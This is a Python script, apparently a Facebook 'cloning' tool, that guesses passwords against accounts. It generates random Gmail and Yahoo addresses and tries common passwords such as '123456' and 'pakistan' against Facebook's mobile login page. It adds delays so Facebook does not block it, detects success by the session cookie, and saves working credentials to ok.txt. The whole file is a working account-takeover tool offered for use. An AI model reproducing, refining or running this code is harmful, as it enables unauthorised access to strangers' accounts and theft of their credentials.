import os, sys, time, random, string, re
try:
    import requests
except ImportError:
    os.system('pip install requests')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- COLORS ---
G = '\033[1;92m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;93m' # Yellow

def login():
    os.system('clear')
    print(f"{G}====================================")
    print(f"{Y}      BASIT SYCO DEEP SCANNER")
    print(f"{G}====================================")
    u = input(f"{W}[+] Username: ")
    p = input(f"{W}[+] Password: ")
    if u == "basitsultan" and p == "basitprince":
        menu()
    else: login()

def deep_scan_logic(user, pwx):
    # Har password ko tarteeb se check karega
    for pas in pwx:
        try:
            # Random delay taake Facebook block na kare aur real lage
            time.sleep(1.5) 
            session = requests.Session()
            ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
            head = {'User-Agent': ua, 'Accept-Language': 'en-US,en;q=0.9'}
            
            # Real Login Request
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers=head, allow_redirects=False)
            
            if "c_user" in session.cookies.get_dict():
                print(f"{G}[SUCCESS-OK] {user} | {pas} {W}")
                with open('ok.txt', 'a') as f: f.write(f"{user}|{pas}\n")
                return True
            else:
                # Agar fail hua to Red mein dikhaye password ke sath
                print(f"{R}[FAILED-X]  {user} | {pas} {W}")
        except:
            print(f"{R}[ERROR] Connection Issue with: {user} {W}")
    return False

def start_cloning():
    os.system('clear')
    print(f"{G}--- DEEP SCAN CLONING (LIVE TARTEEB WISE) ---")
    limit = int(input(f"{W}[+] How many IDs to check?: "))
    
    print(f"\n{Y}[!] Scanning {limit} Targets carefully... Please Wait.\n")
    
    for _ in range(limit):
        # Random Global Names for Real Targeting
        name = "".join(random.choices(string.ascii_lowercase, k=6))
        domain = random.choice(["@gmail.com", "@yahoo.com"])
        user = name + str(random.randint(100, 999)) + domain
        
        # Passwords ki list jo har ID par check hogi
        pwx = [name+"123", name+"786", "123456", "pakistan", "khan123"]
        
        # Ek ek karke check karega (No Multi-threading for real results)
        deep_scan_logic(user, pwx)

    print(f"\n{G}[!] Process Finished. Check ok.txt for successes.")
    input(f"{W}Press Enter to return...")

def menu():
    os.system('clear')
    print(f"{G}[1] Start Deep Scan Cloning (Real & Live)")
    print(f"{R}[0] Exit")
    ch = input(f"\n{W}Select: ")
    if ch == '1': start_cloning()
    else: sys.exit()

if __name__ == "__main__":
    login()
